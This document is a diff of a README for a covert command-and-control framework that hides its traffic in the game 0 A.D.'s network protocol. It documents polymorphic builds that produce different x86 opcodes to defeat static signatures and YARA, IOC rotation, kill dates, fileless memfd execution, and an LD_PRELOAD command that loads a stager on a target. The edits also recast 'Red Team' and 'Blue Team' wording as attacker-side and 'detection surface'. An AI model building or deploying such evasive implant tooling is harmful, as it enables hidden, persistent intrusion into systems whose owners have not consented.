@@ -2,7 +2,7 @@
 
 Command & Control framework that hides its communications inside the network traffic of the open-source game **0 A.D.** (Empires Ascendant).
 
-**Context**: Authorized internal Red Team use only.
+**Context**: Authorized internal offensive security use only.
 
 ---
 
@@ -21,7 +21,7 @@ Command & Control framework that hides its communications inside the network tra
 11. [Operator Commands](#11-operator-commands)
 12. [Agent Delivery](#12-agent-delivery)
 13. [UDP/0AD vs HTTPS](#13-udp0ad-vs-https)
-14. [Blue Team Detection](#14-blue-team-detection)
+14. [Known Detection Surface](#14-known-detection-surface)
 15. [References](#15-references)
 
 ---
@@ -369,7 +369,7 @@ static volatile uint8_t _k_sb_lo = 0x3u;  // low nibble
 
 #### Player name pool
 
-200 historical and gamer bases, mutated on each build:
+194 historical and gamer bases, mutated on each build:
 ```
 caesar → caesar7x    leonidas → 42leonidas
 saladin → lssaladin  spartan → 93spartan
@@ -387,7 +387,7 @@ Each `make poly_*` invocation produces a binary with **genuinely different x86_6
 | CFG method selection (`poly_cfg.h`) | `gen_poly_cfg.py` picks random values for `POLY_DAEMON`, `POLY_EXEC_CMD`, `POLY_HIDE_NAME`, `POLY_SILENTPULSE` — different code paths compiled each build | ✅ real code | Static + dynamic analysis |
 | Dead-code junk stubs | `gen_poly_stubs.py` generates 6–14 `__attribute__((noinline))` functions with random constants + random CFG templates (linear, branch, loop, byte-array, nested). Referenced via `POLY_CALL_CHAIN` guard that is always false → never executes, but GCC emits real `CALL` instructions | ❌ never | Static signature / YARA |
 | Live idempotent junk macros | `gen_poly_stubs.py` also generates 3–5 `_POLY_LIVE_*` macros inserted at hot call sites (`handle_chat`, main loop, KA send). Execute unconditionally, zero observable effect (`volatile` + result discarded). Templates: accumulator+POLY_DEAD_CONST branch, rotate-XOR, byte-view, arithmetic chain | ✅ always | Dynamic analysis / coverage |
-| GCC internal randomization | `-frandom-seed=<rand>`, `-fstack-reuse=none`, `-falign-functions=<4/8/16/32>` | n/a | Stack layout, instruction scheduling |
+| GCC internal randomization | `-frandom-seed=<rand>`, `-fstack-reuse=none`, `-falign-functions=<4/8/16/32>`, `-falign-loops=<4/8/16/32>` | n/a | Stack layout, instruction scheduling, loop alignment |
 | IOC randomization | Same as Level 1 | n/a | Static strings / keys |
 
 **Why two junk layers?**
@@ -509,10 +509,11 @@ make check_deps
 | `make fresh` | stripped `agent` + `ctrl` (new IOCs) | Prod without stager |
 | `make fresh_all` | `agent` + `ctrl` + `stager` + `stage_srv` (new IOCs everywhere) | **Before every operation** |
 | `make fresh_all EXPIRE_DAYS=30` | Same + kill-date in 30 days compiled into agent | Time-constrained operations |
+| `make fresh_all_debug` | `agent_debug` + `ctrl` + `stager` + `stage_srv` (new IOCs, unstripped) | Full debug build |
 | `make poly_debug` | `agent_debug` + `ctrl` — **different x86 opcodes each run** | Evasion testing, signature defeat |
 | `make poly_all` | All binaries — **different x86 opcodes each run** | Pre-op with binary poly |
-| `make stager_fresh` | Stager only, new stager IOCs | Stager rotation only |
-| `make agent_verbose` | Agent with protocol traces on stderr | Protocol debugging |
+| `make stager_fresh` | Stager only, new stager IOCs forced | Stager rotation only |
+| `make agent_verbose` | Agent with all protocol traces on stderr | Protocol debugging |
 | `make clean` | Remove binaries + generated headers | Full reset |
 
 ### Notable build options
@@ -701,10 +702,14 @@ os.execve('/proc/self/fd/%d' % mfd,
 
 ```bash
 # If a .so can be placed on the target
-# The stager runs in the __attribute__((constructor)) constructor
+# The stager code runs from a __attribute__((constructor)) function in the .so
+# Compile the stager logic as a position-independent shared object (concept):
 gcc -shared -fPIC -nostartfiles -o /tmp/.l.so stager_preload.c
 LD_PRELOAD=/tmp/.l.so /bin/ls
 ```
+
+> `stager_preload.c` is an illustrative example — adapt `stager.c` by wrapping its
+> logic in a `__attribute__((constructor))` function and compiling with `-shared -fPIC`.
 
 ### Option D — Post-exploitation via persistence
 
@@ -777,7 +782,7 @@ From an already established agent:
 | NMT_CHAT sender ∈ ['g'..'n'] | High (stable, defines the protocol) |
 | NMT_CHAT sender length > 36 | High (base62 always longer than a UUID) |
 
-### Red Team mitigations
+### Attacker-side mitigations
 
 | Detection vector | Current mitigation | Future mitigation |
 |-----------------|-------------------|------------------|
